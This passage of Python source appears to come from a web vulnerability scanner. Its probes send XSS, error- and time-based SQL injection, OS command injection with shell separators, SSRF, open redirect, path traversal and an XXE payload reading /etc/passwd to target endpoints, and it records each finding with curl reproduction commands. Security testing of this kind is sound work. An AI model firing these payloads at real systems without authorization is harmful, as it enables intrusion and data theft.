                    for submit in ("Submit", "btnSign", "Sign Guestbook", "Save"):
                        stored_body.setdefault(submit, submit)
                    _req(
                        destination, allow_ip, "POST", ep,
                        body=urlencode(stored_body),
                        headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=timeout,
                    )
                    _, _, back, _ = _req(destination, allow_ip, "GET", ep, timeout=timeout)
                    if xss_payload in back:
                        aff_url = f"{destination.origin}{ep}"
                        findings.append(
                            {
                                "category": "cross_site_scripting",
                                "severity": "high",
                                "title": f"Stored Cross-Site Scripting (XSS) in Parameter '{param}'",
                                "description": f"A canary payload submitted to {ep} via '{param}' was persisted and returned unencoded on a later page load, confirming stored XSS.",
                                "target_url": aff_url,
                                "affected_url": aff_url,
                                "fingerprint": hashlib.sha256(
                                    f"storedxss_{destination.host}_{ep}_{param}".encode()
                                ).hexdigest(),
                                "cwe_id": "CWE-79",
                                "status": "suspected",
                                "lifecycle_state": "CANDIDATE",
                                "remediation": "Encode stored user input on output and enforce a strict Content-Security-Policy.",
                                "poc": {
                                    "method": "POST", "url": aff_url, "parameter": param,
                                    "payload": xss_payload, "canary": xss_payload, "headers": lab_hdrs,
                                    "reproduction_steps": f"POST '{param}={xss_payload}' to {aff_url}, then reload the page and confirm the payload renders unencoded.",
                                },
                                "evidence": [{"endpoint": ep, "parameter": param, "payload": xss_payload, "stored": True}],
                            }
                        )

                # B. Active SQL Injection (Error-Based MariaDB/MySQL/PostgreSQL/SQLite)
                # Java/JDBC and HSQLDB signatures added so error-based SQLi is detected on Spring/JDBC
                # stacks (e.g. OWASP Benchmark runs on HSQLDB) -- all are specific exception-class or
                # driver strings, not generic words, to keep false positives off ordinary error pages.
                sql_regex = _SQL_ERROR_REGEX
                for sqli_payload in ("'", "1'", "' OR '1'='1"):
                    sql_dict = {param: sqli_payload}
                    if is_lab_endpoint or param == "id":
                        sql_dict["Submit"] = "Submit"
                    sql_fuzz = f"{ep}?{urlencode(sql_dict)}"
                    s_status, _, s_body, _ = _req(
                        destination, allow_ip, "GET", sql_fuzz, timeout=timeout
                    )
                    method_used = "GET"
                    repro_query = sql_fuzz
                    matched_sql = bool(re.search(sql_regex, s_body))
                    if not matched_sql:
                        p_body = urlencode(sql_dict)
                        p_headers = {"Content-Type": "application/x-www-form-urlencoded"}
                        s_status, _, s_body_post, _ = _req(
                            destination, allow_ip, "POST", ep, body=p_body, headers=p_headers, timeout=timeout
                        )
                        if re.search(sql_regex, s_body_post):
                            matched_sql = True
                            method_used = "POST"
                            repro_query = ep

                    if matched_sql:
                        repro_url = f"{destination.origin}{repro_query}"
                        aff_url = f"{destination.origin}{ep}"
                        curl_cmd = (
                            f'curl -s -k -X POST "{aff_url}" -d "{urlencode(sql_dict)}"{curl_hdrs}'
                            if method_used == "POST"
                            else f'curl -s -k "{repro_url}"{curl_hdrs}'
                        )
                        findings.append(
                            {
                                "category": "injection",
                                "severity": "critical",
                                "title": f"SQL Injection Vulnerability in Parameter '{param}'",
                                "description": f"Endpoint {ep} returned raw database syntax error signatures when probed with SQL payload '{sqli_payload}' via {method_used}.",
                                "target_url": repro_url,
                                "affected_url": aff_url,
                                "fingerprint": hashlib.sha256(
                                    f"sqli_{destination.host}_{ep}_{param}".encode()
                                ).hexdigest(),
                                "cwe_id": "CWE-89",
                                "status": "suspected",
                                "lifecycle_state": "CANDIDATE",
                                "remediation": "Use parameterized queries or prepared statements; never concatenate user input into SQL commands.",
                                "poc": {
                                    "method": method_used,
                                    "url": aff_url,
                                    "curl_command": curl_cmd,
                                    "parameter": param,
                                    "payload": sqli_payload,
                                    "canary": "syntax",
                                    "headers": lab_hdrs,
                                    "extra_params": {"Submit": "Submit"} if "Submit" in sql_dict else {},
                                    "reproduction_steps": f"Issue {method_used} request to {aff_url} with Cookie: security={lab_sec} to observe database syntax error in response.",
                                },
                                "evidence": [
                                    {
                                        "endpoint": ep,
                                        "parameter": param,
                                        "status": s_status,
                                        "method": method_used,
                                    }
                                ],
                            }
                        )
                        break

                # C. Active Boolean-Based Differential SQL Injection Probe
                sqli_bool_finding = _evaluate_boolean_blind_sqli(
                    destination=destination,
                    allow_ip=allow_ip,
                    ep=ep,
                    param=param,
                    is_lab_endpoint=is_lab_endpoint,
                    timeout=timeout,
                    sql_regex=sql_regex,
                    auth=auth,
                )
                if sqli_bool_finding:
                    findings.append(sqli_bool_finding)

                # D. Path Traversal / Local File Inclusion (LFI) Probe (W2: no name gate -- real surfaces
                # name the path param anything; GET reaches the sink here because benchmark/Spring servlets
                # delegate doGet->doPost. Echo + blind file-existence differential, both 0-FP by construction.)
                _lfi = _lfi_probe(
                    lambda p, _ep=ep, _pm=param: _req(
                        destination, allow_ip, "GET", f"{_ep}?{urlencode({_pm: p})}", timeout=timeout
                    )[2],
                    param, ep, destination.origin,
                )
                if _lfi:
                    findings.append(_lfi)

                # E. SSRF (Server-Side Request Forgery) Probe
                if param.lower() in (
                    "url",
                    "dest",
                    "uri",
                    "path",
                    "feed",
                    "proxy",
                    "target",
                    "api",
                    "link",
                    "domain",
                    "callback",
                    "webhook",
                    "fetch",
                    "load",
                    "src",
                    "r",
                    "redirect_to",
                ):
                    ssrf_payload = "http://127.0.0.1:80/"
                    ssrf_fuzz = f"{ep}?{urlencode({param: ssrf_payload})}"
                    # Baseline request to ensure signatures are not static website text
                    base_status, _, base_body, _ = _req(
                        destination, allow_ip, "GET", ep, timeout=timeout
                    )
                    ss_status, _, ss_body, _ = _req(
                        destination, allow_ip, "GET", ssrf_fuzz, timeout=timeout
                    )
                    # Strict internal loopback connection error traces (explicit connection attempts)
                    ssrf_error_signatures = (
                        "failed to connect to 127.0.0.1",
                        "connection refused: 127.0.0.1",
                        "dial tcp 127.0.0.1",
                        "cURL error 7: Failed to connect to 127.0.0.1",
                        "network is unreachable: 127.0.0.1",
                        "errno 111 connection refused",
                    )
                    has_ssrf_signal = any(
                        sig in ss_body.lower() and sig not in base_body.lower()
                        for sig in ssrf_error_signatures
                    )
                    if has_ssrf_signal:
                        repro_url = f"{destination.origin}{ssrf_fuzz}"
                        findings.append(
                            {
                                "category": "server_side_request_forgery",
                                "severity": "high",
                                "title": f"Server-Side Request Forgery (SSRF) in Parameter '{param}'",
                                "description": f"Endpoint {ep} attempted outbound connection to internal loopback service when probed with '{ssrf_payload}', confirmed by distinct loopback error trace in response.",
                                "target_url": repro_url,
                                "fingerprint": hashlib.sha256(
                                    f"ssrf_{destination.host}_{ep}_{param}".encode()
                                ).hexdigest(),
                                "cwe_id": "CWE-918",
                                "confidence": "high",
                                "status": "suspected",
                                "lifecycle_state": "CANDIDATE",
                                "remediation": "Restrict outbound server requests using an IP allowlist and block private IP address ranges (RFC 1918 / loopback).",
                                "poc": {
                                    "method": "GET",
                                    "url": repro_url,
                                    "curl_command": f'curl -s -k "{repro_url}"',
                                    "parameter": param,
                                    "payload": ssrf_payload,
                                    "reproduction_steps": f"Issue GET request to {repro_url} and inspect server response for internal loopback socket error traces.",
                                },
                                "evidence": [{"endpoint": ep, "parameter": param, "status": ss_status}],
                            }
                        )

                # F. OS Command Injection Probe (W1: no name gate -- output-based cmdi probed on every parameter)
                if param:
                    for cmd_payload in (
                        "127.0.0.1; echo sharay_canary_cmd",
                        "127.0.0.1 | echo sharay_canary_cmd",
                        "127.0.0.1|echo sharay_canary_cmd",
                        "127.0.0.1 & echo sharay_canary_cmd",
                    ):
                        cmd_dict = {param: cmd_payload}
                        if is_lab_endpoint or "ping" in ep or "exec" in ep:
                            cmd_dict["Submit"] = "Submit"
                        cmd_fuzz = f"{ep}?{urlencode(cmd_dict)}"
                        c_status, _, c_body, _ = _req(
                            destination, allow_ip, "GET", cmd_fuzz, timeout=timeout
                        )
                        method_used = "GET"
                        body_matched = (
                            "sharay_canary_cmd" in c_body
                            and "echo sharay_canary_cmd" not in c_body
                            and "echo+sharay_canary_cmd" not in c_body
                            and "_get[" not in c_body.lower()
                        )

                        # If GET did not trigger (e.g. form expects POST), probe via POST
                        if not body_matched:
                            p_body = urlencode(cmd_dict)
                            p_headers = {"Content-Type": "application/x-www-form-urlencoded"}
                            c_status, _, c_body_post, _ = _req(
                                destination,
                                allow_ip,
                                "POST",
                                ep,
                                body=p_body,
                                headers=p_headers,
                                timeout=timeout,
                            )
                            if (
                                "sharay_canary_cmd" in c_body_post
                                and "echo sharay_canary_cmd" not in c_body_post
                                and "echo+sharay_canary_cmd" not in c_body_post
                                and "_post[" not in c_body_post.lower()
                            ):
                                body_matched = True
                                method_used = "POST"
                                repro_query = ep

                        if body_matched:
                            repro_url = f"{destination.origin}{repro_query}"
                            aff_url = f"{destination.origin}{ep}"
                            curl_cmd = (
                                f'curl -s -k -X POST "{aff_url}" -d "{urlencode(cmd_dict)}"{curl_hdrs}'
                                if method_used == "POST"
                                else f'curl -s -k "{repro_url}"{curl_hdrs}'
                            )
                            findings.append(
                                {
                                    "category": "injection",
                                    "severity": "critical",
                                    "title": f"OS Command Injection Vulnerability in Parameter '{param}'",
                                    "description": f"Endpoint {ep} executed shell command separator and returned probe canary output via {method_used}.",
                                    "target_url": repro_url,
                                    "affected_url": aff_url,
                                    "fingerprint": hashlib.sha256(
                                        f"cmdi_{destination.host}_{ep}_{param}".encode()
                                    ).hexdigest(),
                                    "cwe_id": "CWE-78",
                                    "status": "suspected",
                                    "lifecycle_state": "CANDIDATE",
                                    "remediation": "Avoid passing user input to system shell execution; use subprocess with explicit argument vectors.",
                                    "poc": {
                                        "method": method_used,
                                        "url": aff_url,
                                        "curl_command": curl_cmd,
                                        "parameter": param,
                                        "payload": cmd_payload,
                                        "canary": "sharay_canary_cmd",
                                        "headers": lab_hdrs,
                                        "extra_params": {"Submit": "Submit"} if "Submit" in cmd_dict else {},
                                        "reproduction_steps": f"Issue {method_used} request to {repro_url} and observe shell canary output in response body.",
                                    },
                                    "evidence": [
                                        {
                                            "endpoint": ep,
                                            "parameter": param,
                                            "status": c_status,
                                            "method": method_used,
                                        }
                                    ],
                                }
                            )
                            break

                # G. Open Redirect Probe
                if param.lower() in (
                    "redirect",
                    "url",
                    "next",
                    "return",
                    "dest",
                    "destination",
                    "target",
                    "r",
                ):
                    redir_payload = "https://example.com"
                    redir_fuzz = f"{ep}?{urlencode({param: redir_payload})}"
                    r_status, r_hdrs, _, _ = _req(
                        destination, allow_ip, "GET", redir_fuzz, timeout=timeout
                    )
                    loc = r_hdrs.get("location", "")
                    if r_status in (301, 302, 303, 307, 308) and loc.startswith("https://example.com"):
                        repro_url = f"{destination.origin}{redir_fuzz}"
                        findings.append(
                            {
                                "category": "open_redirect",
                                "severity": "medium",
                                "title": f"Open URL Redirect Vulnerability in Parameter '{param}'",
                                "description": f"Endpoint {ep} blindly redirected client requests to untrusted external URL '{redir_payload}'.",
                                "target_url": repro_url,
                                "fingerprint": hashlib.sha256(
                                    f"redir_{destination.host}_{ep}_{param}".encode()
                                ).hexdigest(),
                                "cwe_id": "CWE-601",
                                "status": "suspected",
                                "lifecycle_state": "CANDIDATE",
                                "remediation": "Validate redirect targets against an approved list of relative paths or trusted internal domains.",
                                "poc": {
                                    "method": "GET",
                                    "url": repro_url,
                                    "curl_command": f'curl -s -k -I "{repro_url}"',
                                    "parameter": param,
                                    "payload": redir_payload,
                                    "reproduction_steps": f"Issue HEAD or GET request to {repro_url} and inspect Location header pointing to external URL.",
                                },
                                "evidence": [{"status": r_status, "location": loc}],
                            }
                        )

                # H. Time-Based Blind SQL Injection (statistical delay oracle; no error/reflection needed)
                time_extra = {"Submit": "Submit"} if (is_lab_endpoint or param == "id") else None
                n = _BLIND_SLEEP_SECONDS
                sqli_time_payloads = [
                    f"1' AND SLEEP({n})-- -",
                    f"1';SELECT pg_sleep({n})-- -",
                    f"1' AND 1=(SELECT 1 FROM PG_SLEEP({n}))-- -",
                    f"1';WAITFOR DELAY '0:0:{n}'-- -",
                ]
                sqli_hit = _time_based_blind_injection(
                    destination, allow_ip, ep, param, time_extra, sqli_time_payloads, timeout, auth=auth
                )
                if sqli_hit:
                    time_fuzz = f"{ep}?{urlencode({param: sqli_hit, **(time_extra or {})})}"
                    repro_url = f"{destination.origin}{time_fuzz}"
                    findings.append(
                        {
                            "category": "injection",
                            "severity": "critical",
                            "title": f"Time-Based Blind SQL Injection in Parameter '{param}'",
                            "description": f"Endpoint {ep} delayed its response past a calibrated baseline (mean+3σ+{n}s) on 3 consecutive trials when injected with a database sleep payload, proving blind SQL execution without any error signature.",
                            "target_url": repro_url,
                            "fingerprint": hashlib.sha256(
                                f"sqli_time_{destination.host}_{ep}_{param}".encode()
                            ).hexdigest(),
                            "cwe_id": "CWE-89",
                            "confidence": "high",
                            "remediation": "Use parameterized queries or prepared statements; never concatenate user input into SQL commands.",
                            "poc": {
                                "method": "GET",
                                "url": repro_url,
                                "curl_command": f'curl -s -k "{repro_url}" -H "Cookie: security=low"',
                                "parameter": param,
                                "payload": sqli_hit,
                                "reproduction_steps": f"Issue GET request to {repro_url}; the response is delayed ~{n}s versus a benign value, reproduced across 3 trials.",
                            },
                            "evidence": [
                                {
                                    "endpoint": ep,
                                    "parameter": param,
                                    "oracle": "statistical_time_delay",
                                    "delay_seconds": n,
                                    "trials": 3,
                                }
                            ],
                        }
                    )

                # I. Time-Based Blind OS Command Injection (shell sleep separators)
                if param.lower() in (
                    "ip",
                    "host",
                    "ping",
                    "cmd",
                    "exec",
                    "daemon",
                    "target",
                    "domain",
                    "query",
                ):
                    cmd_time_payloads = [
                        f"127.0.0.1; sleep {n}",
                        f"127.0.0.1| sleep {n}",
                        f"127.0.0.1$(sleep {n})",
                        f"127.0.0.1`sleep {n}`",
                    ]
                    cmd_hit = _time_based_blind_injection(
                        destination, allow_ip, ep, param, time_extra, cmd_time_payloads, timeout, auth=auth
                    )
                    if cmd_hit:
                        time_fuzz = f"{ep}?{urlencode({param: cmd_hit, **(time_extra or {})})}"
                        repro_url = f"{destination.origin}{time_fuzz}"
                        findings.append(
                            {
                                "category": "injection",
                                "severity": "critical",
                                "title": f"Time-Based Blind OS Command Injection in Parameter '{param}'",
                                "description": f"Endpoint {ep} delayed its response past a calibrated baseline (mean+3σ+{n}s) on 3 consecutive trials when injected with a shell sleep separator, proving blind command execution with no reflected output.",
                                "target_url": repro_url,
                                "fingerprint": hashlib.sha256(
                                    f"cmdi_time_{destination.host}_{ep}_{param}".encode()
                                ).hexdigest(),
                                "cwe_id": "CWE-78",
                                "confidence": "high",
                                "remediation": "Avoid passing user input to system shell execution; use subprocess with explicit argument vectors.",
                                "poc": {
                                    "method": "GET",
                                    "url": repro_url,
                                    "curl_command": f'curl -s -k "{repro_url}" -H "Cookie: security=low"',
                                    "parameter": param,
                                    "payload": cmd_hit,
                                    "reproduction_steps": f"Issue GET request to {repro_url}; the response is delayed ~{n}s versus a benign value, reproduced across 3 trials.",
                                },
                                "evidence": [
                                    {
                                        "endpoint": ep,
                                        "parameter": param,
                                        "oracle": "statistical_time_delay",
                                        "delay_seconds": n,
                                        "trials": 3,
                                    }
                                ],
                            }
                        )
            except Exception:
                pass

        # XXE: POST an XML external-entity payload that reads /etc/passwd in-band (Phase 1, CWE-611).
        try:
            _xxe = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
            _, _, _xb, _ = _req(
                destination, allow_ip, "POST", ep, body=_xxe,
                headers={"Content-Type": "application/xml"}, timeout=timeout,
            )
            if _xb and re.search(_LFI_ROOT_SIG, html.unescape(_xb)):
                _xaff = f"{destination.origin}{ep}"
                findings.append(
                    {
                        "category": "injection",
                        "severity": "critical",
                        "title": "XML External Entity (XXE) Injection",
                        "description": f"Endpoint {ep} resolved an injected external XML entity and returned /etc/passwd content, confirming XXE.",
                        "target_url": _xaff,
                        "affected_url": _xaff,
                        "fingerprint": hashlib.sha256(f"xxe_{destination.host}_{ep}".encode()).hexdigest(),
                        "cwe_id": "CWE-611",
                        "status": "suspected",
                        "lifecycle_state": "CANDIDATE",
                        "remediation": "Disable external-entity and DTD processing in the XML parser (XXE-safe configuration).",
                        "poc": {"method": "POST", "url": _xaff, "parameter": "xml body", "payload": _xxe,
                                "reproduction_steps": f"POST the XXE payload to {_xaff} with Content-Type application/xml; the response contains /etc/passwd."},
                        "evidence": [{"endpoint": ep, "vector": "xml_body", "cwe": "CWE-611"}],
                    }
                )
        except Exception:
            pass

        # Query-vector LDAP/XPath injection for each discovered param (W4).
        for _lxp in ep_params:
            try:
                _lxq = _injection_error_probe(
                    lambda val, pp=_lxp: _req(
                        destination, allow_ip, "GET", f"{ep}?{urlencode({pp: val})}", timeout=timeout
                    )[2],
                    _lxp, ep, destination.origin,
                )
                if _lxq:
                    findings.append(_lxq)
            except Exception:
                pass

        # --- Additive vector pass: cookie- and header-delivered injection (reflected XSS + error SQLi).
        # Layered on top of the query/form fuzzing above without changing it, so taint that arrives via a
        # cookie or request header -- common in Java/Spring apps and the OWASP Benchmark -- is covered too.
        # Reuses the same canary and _SQL_ERROR_REGEX; each probe is isolated so one bad header name (an
        # invalid token) only skips that probe.
        _taint_headers = ("Referer", "X-Forwarded-For", "X-Forwarded-Host", "True-Client-IP", "User-Agent")
        _vector_targets = (
            [("cookie", p) for p in ep_params]
            + [("header", p) for p in ep_params]
            + [("header", h) for h in _taint_headers]
        )
        for _kind, _name in _vector_targets:
            _vtag = hashlib.md5(f"{ep}:{_kind}:{_name}".encode()).hexdigest()[:6]
            _vxss = f'"><sharay_canary_{canary_nonce}_{_vtag}>'
            _aff = f"{destination.origin}{ep}"
            # Reflected XSS via this cookie/header.
            try:
                _hx = {"Cookie": f"{_name}={_vxss}"} if _kind == "cookie" else {_name: _vxss}
                _, _, _xbody, _ = _req(destination, allow_ip, "GET", ep, headers=_hx, timeout=timeout)
                if _vxss in _xbody:
                    findings.append(
                        {
                            "category": "cross_site_scripting",
                            "severity": "high",
                            "title": f"Reflected Cross-Site Scripting (XSS) via {_kind} '{_name}'",
                            "description": f"Endpoint {ep} reflected a payload supplied in the {_kind} '{_name}' unencoded.",
                            "target_url": _aff,
                            "affected_url": _aff,
                            "fingerprint": hashlib.sha256(
                                f"xss_{_kind}_{destination.host}_{ep}_{_name}".encode()
                            ).hexdigest(),
                            "cwe_id": "CWE-79",
                            "status": "suspected",
                            "lifecycle_state": "CANDIDATE",
                            "remediation": "Encode request-supplied values on output, including request headers and cookies; set a strict Content-Security-Policy.",
                            "poc": {
                                "method": "GET",
                                "url": _aff,
                                "parameter": f"{_kind}:{_name}",
                                "payload": _vxss,
                                "reproduction_steps": f"GET {_aff} with the {_kind} '{_name}' set to the payload; it renders unencoded.",
                            },
                            "evidence": [{"endpoint": ep, "vector": _kind, "name": _name, "payload": _vxss}],
                        }
                    )
            except Exception:
                pass
            # Error-based SQLi via this cookie/header (single-quote probe).
            try:
                _hs = {"Cookie": f"{_name}='"} if _kind == "cookie" else {_name: "'"}
                _, _, _sbody, _ = _req(destination, allow_ip, "GET", ep, headers=_hs, timeout=timeout)
                if re.search(_SQL_ERROR_REGEX, _sbody):
                    findings.append(
                        {
                            "category": "injection",
                            "severity": "critical",
                            "title": f"SQL Injection via {_kind} '{_name}'",
                            "description": f"Endpoint {ep} returned a database syntax error when a single quote was supplied in the {_kind} '{_name}'.",
                            "target_url": _aff,
                            "affected_url": _aff,
                            "fingerprint": hashlib.sha256(
                                f"sqli_{_kind}_{destination.host}_{ep}_{_name}".encode()
                            ).hexdigest(),
                            "cwe_id": "CWE-89",
                            "status": "suspected",
                            "lifecycle_state": "CANDIDATE",
                            "remediation": "Use parameterized queries; never concatenate request-supplied values (headers and cookies included) into SQL.",
                            "poc": {
                                "method": "GET",
                                "url": _aff,
                                "parameter": f"{_kind}:{_name}",
                                "payload": "'",
                                "reproduction_steps": f"GET {_aff} with the {_kind} '{_name}' set to a single quote to observe a database error.",
                            },
                            "evidence": [{"endpoint": ep, "vector": _kind, "name": _name}],
                        }
                    )
            except Exception:
                pass
            # LDAP/XPath injection via this cookie/header (W4).
            try:
                _lx = _injection_error_probe(
                    lambda val, k=_kind, n=_name: _req(
                        destination, allow_ip, "GET", ep,
                        headers=({"Cookie": f"{n}={val}"} if k == "cookie" else {n: val}),
                        timeout=timeout,
                    )[2],
                    f"{_kind}:{_name}", ep, destination.origin,
                )
                if _lx:
                    findings.append(_lx)
            except Exception:
                pass
            # Path traversal via this cookie/header (W2). These sinks live in doPost in Java/Spring apps,
            # so probe via POST (a tiny body makes the servlet run doPost); echo + existence differential.
            try:
                _lf = _lfi_probe(
                    lambda val, k=_kind, n=_name: _req(
                        destination, allow_ip, "POST", ep,
                        headers=({"Cookie": f"{n}={val}"} if k == "cookie" else {n: val}),
                        body="x=y", timeout=timeout,
                    )[2],
                    f"{_kind}:{_name}", ep, destination.origin,
                )
                if _lf:
                    findings.append(_lf)
            except Exception:
                pass

        # --- Additive vector pass (P1.2): JSON request-body injection. Modern APIs read inputs from a JSON
        # body, not query/form fields, so fuzz each candidate param as a JSON key. Gated to API-looking
        # endpoints to bound cost; reuses the same oracles (XSS reflection, SQL error, LDAP/XPath/NoSQL/SSTI,
        # path traversal) so the JSON vector gets the full battery.
        if re.search(r"(?:/api\b|/v\d+\b|/rest\b|/graphql\b|\.json\b|/json\b)", ep, re.I):
            _jaff = f"{destination.origin}{ep}"
            for _jp in ep_params:
                if audit_deadline is not None and time.monotonic() > audit_deadline:
                    break

                def _jsend(val, p=_jp):
                    return _req(
                        destination, allow_ip, "POST", ep,
                        headers={"Content-Type": "application/json"},
                        body=json.dumps({p: val}), timeout=timeout,
                    )[2]

                _jtag = hashlib.md5(f"{ep}:json:{_jp}".encode()).hexdigest()[:6]
                _jxss = f'"><sharay_canary_{canary_nonce}_{_jtag}>'
                try:  # reflected XSS via JSON body
                    _jb = _jsend(_jxss)
                    if _jb and _jxss in _jb:
                        findings.append({
                            "category": "cross_site_scripting", "severity": "high",
                            "title": f"Reflected Cross-Site Scripting (XSS) via JSON body field '{_jp}'",
                            "description": f"Endpoint {ep} reflected a payload supplied in the JSON body field '{_jp}' unencoded.",
                            "target_url": _jaff, "affected_url": _jaff,
                            "fingerprint": hashlib.sha256(f"xss_json_{destination.host}_{ep}_{_jp}".encode()).hexdigest(),
                            "cwe_id": "CWE-79", "status": "suspected", "lifecycle_state": "CANDIDATE",
                            "remediation": "Encode request-supplied values on output, including JSON body fields; set a strict Content-Security-Policy.",
                            "poc": {"method": "POST", "url": _jaff, "parameter": f"json:{_jp}", "payload": _jxss,
                                    "reproduction_steps": f"POST {{'{_jp}': <payload>}} as application/json to {_jaff}; it renders unencoded."},
                            "evidence": [{"endpoint": ep, "vector": "json", "name": _jp}],
                        })
                except Exception:
                    pass
                try:  # error-based SQLi via JSON body
                    _jsb = _jsend("'")
                    if _jsb and re.search(_SQL_ERROR_REGEX, _jsb):
                        findings.append({
                            "category": "injection", "severity": "critical",
                            "title": f"SQL Injection via JSON body field '{_jp}'",
                            "description": f"Endpoint {ep} returned a database syntax error when a single quote was supplied in the JSON body field '{_jp}'.",
                            "target_url": _jaff, "affected_url": _jaff,
                            "fingerprint": hashlib.sha256(f"sqli_json_{destination.host}_{ep}_{_jp}".encode()).hexdigest(),
                            "cwe_id": "CWE-89", "status": "suspected", "lifecycle_state": "CANDIDATE",
                            "remediation": "Use parameterized queries; never concatenate JSON body values into SQL.",
                            "poc": {"method": "POST", "url": _jaff, "parameter": f"json:{_jp}", "payload": "'",
                                    "reproduction_steps": f"POST {{'{_jp}': \"'\"}} as application/json to {_jaff} to observe a database error."},
                            "evidence": [{"endpoint": ep, "vector": "json", "name": _jp}],
                        })
                except Exception:
                    pass
                try:  # LDAP/XPath/NoSQL/SSTI + path traversal via JSON body
                    _jx = _injection_error_probe(_jsend, f"json:{_jp}", ep, destination.origin)
                    if _jx:
                        findings.append(_jx)
                    _jl = _lfi_probe(_jsend, f"json:{_jp}", ep, destination.origin)
                    if _jl:
                        findings.append(_jl)
                except Exception:
                    pass

    # 2c. Additive per-form pass: fuzz each discovered form's OWN inputs at its OWN action URL, so a
    # target whose injectable parameter differs per page (not one shared global name) is actually reached
    # -- this is what covers real apps, and benchmarks, that name the tainted input per endpoint. Sibling
    # inputs are sent at their seed values so the server-side sink is genuinely hit; reuses the same canary
    # and _SQL_ERROR_REGEX. Deadline-bounded and non-destructive (install/reset/logout actions skipped).
    form_canary = f"sharayform{os.urandom(4).hex()}"
    seen_form_probes: set[str] = set()
    for form in discovered_forms or []:
        if audit_deadline is not None and time.monotonic() > audit_deadline:
            break
        action_path = urlsplit(str(form.get("action") or "")).path or dest_path
        if not action_path or _DESTRUCTIVE_ENDPOINT.search(action_path):
            continue
        method = str(form.get("method") or "GET").upper()
        inputs = [i for i in (form.get("inputs") or []) if isinstance(i, dict) and i.get("name")]
        if not inputs:
            continue
        base = {str(i["name"]): str(i.get("value") or "sharay") for i in inputs}
        for pname in list(dict.fromkeys(str(i["name"]) for i in inputs))[:25]:
            probe_key = f"{method}:{action_path}:{pname}"
            if probe_key in seen_form_probes:
                continue
            seen_form_probes.add(probe_key)
            ftag = hashlib.md5(probe_key.encode()).hexdigest()[:6]
            fxss = f'"><sharay_canary_{form_canary}_{ftag}>'
            aff = f"{destination.origin}{action_path}"
            for _payload, _is_xss in ((fxss, True), ("'", False)):
                params = {**base, pname: _payload}
                try:
                    if method == "POST":
                        _, _, _fb, _ = _req(
                            destination, allow_ip, "POST", action_path, body=urlencode(params),
                            headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=timeout,
                        )
                    else:
                        _, _, _fb, _ = _req(
                            destination, allow_ip, "GET", f"{action_path}?{urlencode(params)}", timeout=timeout
                        )
                except Exception:
                    continue
                if _is_xss and fxss in _fb:
                    findings.append(
                        {
                            "category": "cross_site_scripting",
                            "severity": "high",
                            "title": f"Reflected Cross-Site Scripting (XSS) in form field '{pname}'",
                            "description": f"Form at {action_path} reflected a payload submitted in field '{pname}' unencoded.",
                            "target_url": aff,
                            "affected_url": aff,
                            "fingerprint": hashlib.sha256(f"xssform_{destination.host}_{action_path}_{pname}".encode()).hexdigest(),
                            "cwe_id": "CWE-79",
                            "status": "suspected",
                            "lifecycle_state": "CANDIDATE",
                            "remediation": "Encode form-submitted values on output and enforce a strict Content-Security-Policy.",
                            "poc": {
                                "method": method, "url": aff, "parameter": pname, "payload": fxss,
                                "reproduction_steps": f"Submit the form at {aff} with '{pname}' set to the payload; it renders unencoded.",
                            },
                            "evidence": [{"endpoint": action_path, "parameter": pname, "method": method, "vector": "form"}],
                        }
                    )
                elif not _is_xss and re.search(_SQL_ERROR_REGEX, _fb):
                    findings.append(
                        {
                            "category": "injection",
                            "severity": "critical",
                            "title": f"SQL Injection in form field '{pname}'",
                            "description": f"Form at {action_path} returned a database syntax error when field '{pname}' was a single quote.",
                            "target_url": aff,
                            "affected_url": aff,
                            "fingerprint": hashlib.sha256(f"sqliform_{destination.host}_{action_path}_{pname}".encode()).hexdigest(),
                            "cwe_id": "CWE-89",
                            "status": "suspected",
                            "lifecycle_state": "CANDIDATE",
                            "remediation": "Use parameterized queries; never concatenate form-submitted values into SQL.",
                            "poc": {
                                "method": method, "url": aff, "parameter": pname, "payload": "'",
                                "reproduction_steps": f"Submit the form at {aff} with '{pname}' set to a single quote to observe a database error.",
                            },
                            "evidence": [{"endpoint": action_path, "parameter": pname, "method": method, "vector": "form"}],
                        }
                    )
            # LDAP/XPath injection in this form field (W4).
            def _form_send(val, ap=action_path, bp=base, pn=pname, m=method):
                _ps = {**bp, pn: val}
                if m == "POST":
                    return _req(destination, allow_ip, "POST", ap, body=urlencode(_ps),
                                headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=timeout)[2]
                return _req(destination, allow_ip, "GET", f"{ap}?{urlencode(_ps)}", timeout=timeout)[2]
            _lxf = _injection_error_probe(_form_send, pname, action_path, destination.origin)
            if _lxf:
                findings.append(_lxf)
            # Path traversal in this form field (W2) -- reuses the form's own method/sibling values.
            _lff = _lfi_probe(_form_send, pname, action_path, destination.origin)
            if _lff:
                findings.append(_lff)

    # 3. Header Security Audit (CSP, HSTS, X-Frame-Options, Information Leaks)
    try:
        status, headers, _, _ = _req(destination, allow_ip, "GET", "/", timeout=timeout)
        # Follow one same-origin redirect so posture is audited on the real page, not the 301 stub.
        if status in (301, 302, 303, 307, 308):
            parts = urlsplit(headers.get("location", ""))
            same_origin = (not parts.netloc) or (
                (parts.hostname or "").lower() == destination.host.lower()
                and (not parts.scheme or parts.scheme == destination.scheme)
            )
            if same_origin and parts.path:
                hop = f"{parts.path}?{parts.query}" if parts.query else parts.path
                status, headers, _, _ = _req(destination, allow_ip, "GET", hop, timeout=timeout)
        csp = headers.get("content-security-policy")
        hsts = headers.get("strict-transport-security")
        xfo = headers.get("x-frame-options")
        xcto = headers.get("x-content-type-options")
        server = headers.get("server", "")
        powered_by = headers.get("x-powered-by", "")

        if not csp:
            findings.append(
                {
                    "category": "security_misconfiguration",
                    "severity": "medium",
                    "title": "Missing Content-Security-Policy (CSP) Header",
                    "description": "Content-Security-Policy is not enforced, leaving users vulnerable to Cross-Site Scripting (XSS) and data injection attacks.",
                    "target_url": destination.url,
                    "fingerprint": hashlib.sha256(f"csp_missing_{destination.host}".encode()).hexdigest(),
                    "cwe_id": "CWE-1021",
                    "remediation": "Deploy a robust Content-Security-Policy restricting script sources to trusted origins.",
                    "evidence": [{"headers_observed": list(headers.keys())}],
                }
            )

        if destination.scheme == "https" and not hsts:
            findings.append(
                {
                    "category": "security_misconfiguration",
                    "severity": "medium",
                    "title": "Missing HTTP Strict-Transport-Security (HSTS) Header",
                    "description": "The web application does not transmit the Strict-Transport-Security header over HTTPS, allowing SSL-stripping man-in-the-middle attacks.",
                    "target_url": destination.url,
